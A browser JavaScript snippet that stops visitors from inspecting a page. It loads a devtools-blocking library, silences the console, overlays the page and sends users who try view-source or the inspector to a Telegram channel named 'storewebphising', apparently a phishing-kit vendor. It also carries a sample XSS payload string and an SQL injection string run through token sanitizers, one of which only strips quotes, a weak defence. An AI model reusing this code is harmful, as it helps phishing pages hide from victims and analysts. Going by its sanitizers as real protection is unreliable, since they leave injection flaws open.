(function() {
    var disableDevtoolScript = document.createElement('script');
    disableDevtoolScript.src = 'https://cdn.jsdelivr.net/npm/disable-devtool';
    disableDevtoolScript.setAttribute('disable-devtool-auto', '');
    document.head.appendChild(disableDevtoolScript);

    var asciiArt = `
███╗░░░███╗░█████╗░███╗░░██╗██╗░░░██╗██╗░░░██╗
████╗░████║██╔══██╗████╗░██║╚██╗░██╔╝██║░░░██║
██╔████╔██║███████║██╔██╗██║░╚████╔╝░██║░░░██║
██║╚██╔╝██║██╔══██║██║╚████║░░╚██╔╝░░██║░░░██║
██║░╚═╝░██║██║░░██║██║░╚███║░░░██║░░░╚██████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░
    `;

    Object.defineProperty(window, 'console', {
        get: function() {
            return {
                log: function() {},
                warn: function() {},
                error: function() {},
                info: function() {}
            };
        }
    });

    function disableInteraction() {
        var overlay = document.createElement("div");
        overlay.style.position = "fixed";
        overlay.style.top = "0";
        overlay.style.left = "0";
        overlay.style.width = "100%";
        overlay.style.height = "100%";
        overlay.style.backgroundColor = "rgba(255, 255, 255, 0.9)";
        overlay.style.zIndex = "9999";
        overlay.style.pointerEvents = "auto";
        document.body.appendChild(overlay);
    }

    function sanitizeInput(input) {
        var element = document.createElement('div');
        element.innerText = input;
        return element.innerHTML;
    }

    function preventSQLInjection(input) {
        return input.replace(/['";]/g, '');
    }

    window.addEventListener('keydown', function(event) {
        if (event.ctrlKey && (event.key === 'u' || event.key === 'U') ||
            (event.ctrlKey && event.shiftKey && event.key === 'I')) {
            event.preventDefault();
            window.location.href = 'https://t.me/storewebphising';
        }
    });

    var devtools = /./;
    devtools.toString = function() {
        console.log(asciiArt);
        disableInteraction();
        window.location.href = 'https://t.me/storewebphising';
    };

    console.log(devtools);

    var userInput = '<script>alert("XSS Attack!");</script>';
    var sanitizedInput = sanitizeInput(userInput);
    console.log("Sanitized Input (XSS):", sanitizedInput);

    var sqlInput = "SELECT * FROM users WHERE username = 'admin' --";
    var safeInput = preventSQLInjection(sqlInput);
    console.log("Sanitized Input (SQL Injection):", safeInput);
})();
